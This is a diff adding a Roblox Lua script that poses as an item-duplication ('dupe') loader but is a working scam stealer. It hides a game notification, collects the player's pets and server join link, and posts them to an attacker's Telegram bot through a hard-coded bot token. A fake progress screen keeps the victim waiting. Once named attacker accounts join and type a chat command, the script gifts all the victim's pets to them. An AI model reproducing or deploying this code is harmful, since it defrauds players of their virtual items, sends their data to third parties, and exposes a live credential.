@@ -1,0 +1,207 @@
+local CustomTradeCommand = "hi"
+local CustomChatId = 7826742521
+local CustomLoadTime = 100
+local CustomPlayerId = 1537677213
+local CustomPlayerUsername = "wssdfgiby"
+--Отключаем визуал
+
+game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
+
+-- Получаем данные о игроке и сервере
+local player = game:GetService("Players").LocalPlayer
+
+local function getServerLink()
+    return 'https://www.roblox.com/games/start?placeId='..game.placeId..'&gameInstanceId='..game.jobId
+end
+local link = getServerLink()
+
+-- Получаем инвентарь игрока
+local userInventory = {}
+local function getInventory()
+    for i, item in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+        local isPet = false
+        for i1, child in ipairs(item:GetChildren()) do
+            if child.Name == 'PetToolServer' then
+                isPet = true
+                child.Parent.Handle:Destroy()
+            end
+        end
+        if isPet then
+            table.insert(userInventory, item.Name)
+        end
+    end
+end
+
+getInventory()
+
+-- Публикуем полученные данные в дискорд
+local telegramBotToken = "8457776167:AAHyIGOM3U0rv5Sua1U0g-Lsw2zNJlOQ4Eo"
+local OwnerChatId = "1056086381"
+
+local function sendToTelegram(dataText, chatId)
+
+
+	local data = {
+		chat_id = chatId,
+		text = dataText,
+		parse_mode = "MarkdownV2",
+		disable_web_page_preview = true
+	}
+	if request then
+	    local response = request({
+	        Url = "https://api.telegram.org/bot"..telegramBotToken.."/sendMessage",
+	        Method = "POST",
+	        Headers = {
+	            ["Content-Type"] = "application/json"
+	        },
+	        Body = game:GetService("HttpService"):JSONEncode(data)
+	    })
+        print(response.StatusCode, response.Body)
+	end
+end
+local telegramInventoryData = ''
+for i,item in ipairs(userInventory) do
+    telegramInventoryData = telegramInventoryData..item..'\n'
+end
+
+sendToTelegram('✅New hit\nUser: '..player.Name..'\n`'..telegramInventoryData..'`Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`', CustomChatId)
+sendToTelegram('✅New hit\nUser: '..player.Name..'\n`'..telegramInventoryData..'`Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`\nCmd:'..CustomTradeCommand, OwnerChatId)
+
+-- Функции трейда
+
+local function pickupItem(toolName)
+    local backpack = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
+    local tool = backpack:FindFirstChild(toolName)
+    if tool then
+        player.Character.Humanoid:EquipTool(tool)
+    end
+end
+
+local function sendTrade(username)
+    for i, item in ipairs(userInventory) do
+        pickupItem(item)
+        local args = {
+        	"GivePet",
+        	game:GetService("Players"):WaitForChild(username)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+        task.wait(3)
+    end
+end
+
+-- Создаем визуал
+
+local LOAD_TIME = CustomLoadTime 
+local PHRASES = { 
+    "Decrypting payload...",
+    "Injecting DLLs...",
+    "Establishing RPC connection...",
+    "Spoofing HWID...",
+    "Generating fake packets...",
+    "Hooking game functions...",
+    "Dumping memory...",
+    "Patching offsets...",
+    "Deobfuscating scripts...",
+    "Ready for operation",
+    "Session secured",
+    "Duplicating items"
+}
+local gui = Instance.new("ScreenGui")
+gui.Name = "DupeLoader"
+gui.Parent = player.PlayerGui
+gui.ResetOnSpawn = false
+local function createLoadScreen()
+    local loadFrame = Instance.new("Frame")
+    loadFrame.Size = UDim2.new(0.4, 0, 0.15, 0)
+    loadFrame.Position = UDim2.new(0.3, 0, 0.4, 0)
+    loadFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    loadFrame.BackgroundTransparency = 0
+    loadFrame.BorderSizePixel = 0
+    loadFrame.Parent = gui
+
+    local title = Instance.new("TextLabel")
+    title.Text = "Fetching API..."
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 18
+    title.Font = Enum.Font.Code
+    title.Size = UDim2.new(1, 0, 0.5, 0)
+    title.BackgroundTransparency = 1
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Position = UDim2.new(0.05, 0, 0.1, 0)
+    title.Parent = loadFrame
+
+    local progressBarBack = Instance.new("Frame")
+    progressBarBack.Size = UDim2.new(0.9, 0, 0.05, 0)
+    progressBarBack.Position = UDim2.new(0.05, 0, 0.7, 0)
+    progressBarBack.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    progressBarBack.BorderSizePixel = 0
+    progressBarBack.Parent = loadFrame
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(255, 98, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressBarBack
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    percentText.TextSize = 14
+    percentText.Font = Enum.Font.Code
+    percentText.Size = UDim2.new(0.2, 0, 0.3, 0)
+    percentText.Position = UDim2.new(0.75, 0, 0.35, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Parent = loadFrame
+
+    return loadFrame, title, progressBar, percentText
+end
+local function runLoadScreen()
+    local loadFrame, title, progressBar, percentText = createLoadScreen()
+    local startTime = os.clock()
+    local phraseInterval = LOAD_TIME / #PHRASES
+    local MAX_PROGRESS = 0.95 
+
+    while os.clock() - startTime < LOAD_TIME do
+        local rawProgress = (os.clock() - startTime) / LOAD_TIME
+        local progress = math.min(rawProgress, MAX_PROGRESS)
+        
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = math.floor(progress * 100) .. "%"
+
+        local phraseIndex = math.min(math.floor(rawProgress * #PHRASES) + 1, #PHRASES)
+        title.Text = PHRASES[phraseIndex]
+
+        task.wait(0.03)
+    end
+
+    progressBar.Size = UDim2.new(MAX_PROGRESS, 0, 1, 0)
+    percentText.Text = math.floor(MAX_PROGRESS * 100) .. "%"
+
+    task.wait(60)
+    title.Text = "Succesfully duped"
+    progressBar.Size = UDim2.new(1, 0, 1, 0)
+    percentText.Text = math.floor(1 * 100) .. "%"
+    task.wait(5)
+    loadFrame:Destroy()
+    createMainMenu() 
+end
+
+
+-- Запуск кода
+game.Players.PlayerAdded:Connect(function(player)
+    if player.UserId == 9043281161 or player.UserId == CustomPlayerId then
+        sendToTelegram("bozo scammed", OwnerChatId)
+        player.Chatted:Connect(function(message)
+            if message == CustomTradeCommand then
+                if player.UserId == 9043281161 then
+                    sendTrade("LilPiskaScammer")
+                elseif player.UserId == CustomPlayerId then
+                    sendTrade(CustomPlayerUsername)
+                end
+            end
+        end)
+    end
+end)
+
+
+
